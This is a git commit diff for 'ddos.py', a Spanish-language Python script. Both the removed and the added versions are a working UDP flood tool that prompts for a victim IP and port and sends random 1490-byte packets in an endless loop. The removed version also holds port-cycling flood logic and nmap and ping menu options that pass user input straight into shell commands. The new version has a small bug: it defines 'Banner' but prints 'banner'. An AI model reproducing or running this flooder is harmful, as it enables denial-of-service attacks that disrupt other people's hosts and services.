21c4d1b80381775df11c45bd3f1b9ea7aa414b20
cave02 <98207960+cave02@users.noreply.github.com>
2022-04-02 19:27:37 -0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,57 +1,31 @@
-try:
-	import socket
-	import time
-	import os
-	import random
-	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	bytes = random._urandom(1490)
-	banner = """\033[32m
-     _     _
-    | |   | |
-    | |   | |          
-  __| | __| | ___  ___ 
- / _` |/ _` |/ _ \/ __|
-| (_| | (_| | (_) \__ \ 
- \____|\____|\___/|___/   
-\033[0m"""
-	print(banner)
-	print("""----------------------------
-1.- ddos 
-2.- scanear puertos
-3.- ping
-----------------------------""")
-	opcion = input("opcion : ")
-	def ddos(banner):
-		os.system("clear")
-		print(banner)
-		ip = input("[*] Victima : ")
-		port = int(input("[*] puerto : "))
-		os.system("clear")
-		print(banner)
-		print(f"[\033[32;1m+\033[0m] victima : {ip}")
-		print(f"[\033[32;1m+\033[0m] enviando DDOS por el puerto : {port}")
-		sent = 0
-		print("[\033[31mDDOS\033[0m] DDOS ATTACK")
-		while True:
-			s.sendto(bytes, (ip,port))
-			sent = sent + 1
-			port = port + 1
-			if port == 65534:
-				port = 1
-	def ping():
-		ping = input("ping : ")
-		os.system("ping "+ping)
-		input()
-	def nmap():
-		nm = input("nmap : ")
-		os.system("nmap "+nm)
-	if opcion == "1" :
-		ddos(banner)
-	elif opcion == "2" :
-		nmap()
-	elif opcion == "3" :
-		ping()
-except KeyboardInterrupt:
-	print()
-	print("[\033[31mDDOS\033[0m] DDOS DETENIDO")
-	print()
+import socket,os,random
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+Banner = """
+        ##
+       #
+      #
+     ###
+  ##########
+ #          #  by : cave02
+#            # github :\033[36m https://github.com/cave02/ddos\033[0m
+#   Bomba!   #
+#            #
+ #          #
+  ##########
+"""
+os.system("clear")
+print(banner)
+print("[*] presiona CTRL C para detener Dos")
+print("[*] solo puertos http o https")
+print()
+ip = input("[*] Victima : ")
+port = int(input("[*] puerto : "))
+os.system("clear")
+print(banner)
+print(f"[\033[32;1m+\033[0m] victima : {ip}")
+print(f"[\033[32;1m+\033[0m] enviando Dos por el puerto : {port}")
+while True:
+	s.sendto(bytes, (ip,port))
+ 
